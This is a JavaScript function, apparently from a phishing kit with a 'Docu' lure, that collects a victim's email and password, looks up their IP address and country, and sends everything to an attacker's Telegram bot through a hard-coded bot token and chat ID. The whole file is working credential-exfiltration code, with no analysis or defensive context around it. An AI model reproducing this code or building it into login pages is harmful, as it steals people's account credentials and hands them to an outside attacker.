async function sendToTelegram(email, password, attemptCount = 1) {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipRes.json();

        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=countryCode`);
        const geoData = await geoRes.json();
        const countryCode = geoData.countryCode || 'Unknown';

        const botToken = "5297600586:AAFe0V0vhS5obIcmiiwhdmLaVsRJ7QWhOd4";
        const chatId = "-1002675821270";

        const message = `Docu⚡️⚡️⚡️\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nCountry: ${countryCode}\nAttempt: ${attemptCount}`;

        const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        return telegramRes.ok;
    } catch (error) {
        console.error("Telegram send error:", error);
        return false;
    }
}
